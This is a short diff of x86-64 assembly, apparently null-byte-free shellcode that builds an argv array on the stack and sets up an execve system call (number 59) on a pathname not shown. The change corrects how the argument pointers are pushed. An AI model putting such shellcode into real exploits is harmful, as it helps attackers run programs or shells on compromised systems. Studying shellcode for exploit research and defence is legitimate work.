@@ -10,12 +10,15 @@ _start:
   xor rdi, rdi
   xor rdx, rdx
 
-  push rdi
+  push rdx
 
   lea rdi, [rel _pathname + 0x10101010]
   sub rdi, 0x10101010
 
-  push rdi
+  lea rsi, [rel _pathname + 0x10101010]
+  sub rsi, 0x10101010
+
+  push rsi
   mov rsi, rsp
 
 	mov al, 59
